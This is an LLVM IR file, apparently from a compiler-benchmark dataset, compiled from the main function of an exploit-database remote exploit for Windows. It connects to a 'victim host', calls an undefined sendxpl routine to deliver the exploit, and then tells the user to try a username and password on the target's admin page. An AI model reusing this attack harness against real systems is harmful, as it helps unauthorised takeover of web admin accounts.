; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_987.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_987.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, i32, i32 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [27 x i8] c"[*] Creating socket\09\09[OK]\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"[*] Resolving victim host\09[OK]\0A\00", align 1
@PORT1 = common dso_local global i32 0, align 4
@PORT2 = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [38 x i8] c"[*] Connecting at victim host   [OK]\0A\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.4 = private unnamed_addr constant [66 x i8] c"[*] Now test your username and password\0A    on http://%s/admin/\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [64 x i8] c"[*] Now test your username and password\0A    on http://%s:8077\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 8
  %11 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 6
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 @atoi(i8* %14)
  store i32 %15, i32* %9, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp ne i32 %16, 7
  br i1 %17, label %24, label %18

18:                                               ; preds = %2
  %19 = load i32, i32* %9, align 4
  %20 = icmp slt i32 %19, 1
  br i1 %20, label %24, label %21

21:                                               ; preds = %18
  %22 = load i32, i32* %9, align 4
  %23 = icmp sgt i32 %22, 2
  br i1 %23, label %24, label %26

24:                                               ; preds = %21, %18, %2
  %25 = call i32 (...) @info()
  br label %26

26:                                               ; preds = %24, %21
  %27 = call i32 (...) @banner()
  %28 = load i32, i32* @AF_INET, align 4
  %29 = load i32, i32* @SOCK_STREAM, align 4
  %30 = call i32 @socket(i32 %28, i32 %29, i32 0)
  store i32 %30, i32* %7, align 4
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %32, label %34

32:                                               ; preds = %26
  %33 = call i32 (...) @errsock()
  br label %34

34:                                               ; preds = %32, %26
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0))
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 1
  %38 = load i8*, i8** %37, align 8
  %39 = call %struct.hostent* @gethostbyname(i8* %38)
  store %struct.hostent* %39, %struct.hostent** %11, align 8
  %40 = icmp eq %struct.hostent* %39, null
  br i1 %40, label %41, label %43

41:                                               ; preds = %34
  %42 = call i32 (...) @errgeth()
  br label %43

43:                                               ; preds = %41, %34
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %45 = call i32 @memset(%struct.sockaddr_in* %10, i32 0, i32 16)
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %47 = bitcast i32* %46 to i8*
  %48 = load %struct.hostent*, %struct.hostent** %11, align 8
  %49 = getelementptr inbounds %struct.hostent, %struct.hostent* %48, i32 0, i32 1
  %50 = load i32, i32* %49, align 4
  %51 = load %struct.hostent*, %struct.hostent** %11, align 8
  %52 = getelementptr inbounds %struct.hostent, %struct.hostent* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 4
  %54 = call i32 @memcpy(i8* %47, i32 %50, i32 %53)
  %55 = load i32, i32* @AF_INET, align 4
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %55, i32* %56, align 8
  %57 = load i32, i32* %9, align 4
  %58 = icmp eq i32 %57, 1
  br i1 %58, label %59, label %63

59:                                               ; preds = %43
  %60 = load i32, i32* @PORT1, align 4
  %61 = call i8* @htons(i32 %60)
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i8* %61, i8** %62, align 8
  br label %67

63:                                               ; preds = %43
  %64 = load i32, i32* @PORT2, align 4
  %65 = call i8* @htons(i32 %64)
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i8* %65, i8** %66, align 8
  br label %67

67:                                               ; preds = %63, %59
  %68 = load i32, i32* %7, align 4
  %69 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %70 = call i32 @connect(i32 %68, %struct.sockaddr* %69, i32 16)
  store i32 %70, i32* %8, align 4
  %71 = load i32, i32* %8, align 4
  %72 = icmp slt i32 %71, 0
  br i1 %72, label %73, label %76

73:                                               ; preds = %67
  %74 = load i8**, i8*** %5, align 8
  %75 = call i32 @errconn(i8** %74)
  br label %76

76:                                               ; preds = %73, %67
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  %78 = load i32, i32* %7, align 4
  %79 = call i32* @fdopen(i32 %78, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i32* %79, i32** %6, align 8
  %80 = load i32*, i32** %6, align 8
  %81 = call i32 @setbuf(i32* %80, i32* null)
  %82 = load i32*, i32** %6, align 8
  %83 = load i8**, i8*** %5, align 8
  %84 = load i32, i32* %9, align 4
  %85 = call i32 @sendxpl(i32* %82, i8** %83, i32 %84)
  %86 = load i32, i32* %9, align 4
  %87 = icmp eq i32 %86, 1
  br i1 %87, label %88, label %93

88:                                               ; preds = %76
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 1
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.4, i64 0, i64 0), i8* %91)
  br label %98

93:                                               ; preds = %76
  %94 = load i8**, i8*** %5, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 1
  %96 = load i8*, i8** %95, align 8
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.5, i64 0, i64 0), i8* %96)
  br label %98

98:                                               ; preds = %93, %88
  %99 = load i32, i32* %7, align 4
  %100 = call i32 @shutdown(i32 %99, i32 2)
  %101 = load i32, i32* %7, align 4
  %102 = call i32 @close(i32 %101)
  ret i32 0
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @info(...) #1

declare dso_local i32 @banner(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @errsock(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @errgeth(...) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @errconn(i8**) #1

declare dso_local i32* @fdopen(i32, i8*) #1

declare dso_local i32 @setbuf(i32*, i32*) #1

declare dso_local i32 @sendxpl(i32*, i8**, i32) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
